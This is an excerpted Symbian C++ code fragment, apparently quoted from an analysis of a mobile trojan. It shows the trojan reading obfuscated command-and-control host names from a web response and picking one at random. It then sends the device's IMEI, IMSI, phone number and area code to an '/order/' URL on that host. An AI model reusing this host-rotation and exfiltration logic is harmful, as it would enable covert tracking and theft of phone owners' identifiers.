...
void CAppMain::ConstructL(){
    ...
    this->hostNameList=new (ELeave) CDesC8ArrayFlat(1);
}
...
TInt CAppMain::RetrieveHostNameList(){
    if((iRetrieveHostNameListCount++)%RetrieveHostNameListInterval!=0){
...
TPtrC8 CAppMain::GetHostName(){
    TPtrC8 result;
    TInt size=hostNameList->Count();
    if(size>0){
        if(size==1) result.Set((*hostNameList)[0]);
        else result.Set((*hostNameList)[(GetRandom(1,1000))%size]);
    }
    return result;
}
void CAppMain::OnResponseReceived(const TDesC8& aData){
    if(DebugEnabled()) SaveToFile(KDomainFile,aData);
    TPtrC8 temp;
    temp.Set(FindEnclosed(aData,_L8("aaaaaastart"),_L8("endzzzzzz"),EFalse));
    Log(temp);
    if(temp.Length()>0){
        CDesC8ArrayFlat* list=new (ELeave) CDesC8ArrayFlat(1);
        CleanupStack::PushL(list);
        if(temp.FindF(_L8("and"))>0) SeprateToArray(temp,_L8("and"),*list);
        else list->AppendL(temp);
        if(list->Count()>0){
            hostNameList->Reset();
            for(int i=0;i<list->Count()-1;i++){
                hostNameList->AppendL(ReplaceAll((*list)[i],_L8("dot"),_L8(".")));
            }
        }
...
void CAppMain::OnTimerExpired(){
    switch(iTaskState){
        ...
        break;
        case ERetrieveHostNameList:
        this->RetrieveHostNameList();
        break;
        case EInitialTask: {
            TPtrC8 hostName=this->GetHostName();
        ...
        case EGetOrder: {
            ...
            order.AppendFormat(_L8("\n-----------\nu:http://%S/order/?a=%Sooo%Sooo%dooo%Sooo%Sooo%Sooo%S"),&hostName,&imei,&imsi,manager->GetMachineUId(),&KVersion,&iAppChannel,&iPhoneNumber,&iAreaCode);
            TBuf8<50> variable;
...
void CAppMain::InitializeNetWork(){
    ...
    this->iTaskState=(err?ECleanUp:ERetrieveHostNameList);
